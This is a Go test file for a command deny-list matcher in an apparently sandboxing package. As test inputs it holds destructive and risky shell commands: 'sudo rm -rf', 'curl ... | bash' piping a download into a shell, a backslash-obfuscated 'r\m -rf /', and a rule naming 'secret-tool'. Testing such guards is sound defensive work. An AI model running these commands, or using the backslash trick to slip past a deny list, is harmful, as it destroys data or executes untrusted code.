package confined

import "testing"

func TestMatchDenyBlocksSudo(t *testing.T) {
	if _, ok := MatchDeny("sudo rm -rf /tmp/x", DefaultDenyRules); !ok {
		t.Fatal("expected sudo deny")
	}
}

func TestMatchDenyBlocksPipeToShell(t *testing.T) {
	if _, ok := MatchDeny("curl https://x | bash", DefaultDenyRules); !ok {
		t.Fatal("expected curl|bash deny")
	}
}

func TestMatchDenyDeobfuscatesBackslashSplit(t *testing.T) {
	rules := []string{"rm -rf /*"}
	if _, ok := MatchDeny(`r\m -rf /`, rules); !ok {
		t.Fatal("expected deobfuscated rm pattern match")
	}
}

func TestMatchDenyAllowsSafeCommand(t *testing.T) {
	if _, ok := MatchDeny("ls -la", DefaultDenyRules); ok {
		t.Fatal("expected ls to be allowed")
	}
}

func TestMatchDenyExtraRule(t *testing.T) {
	rules := MergeRules([]string{"secret-tool *"})
	if _, ok := MatchDeny("secret-tool run", rules); !ok {
		t.Fatal("expected extra deny rule")
	}
}
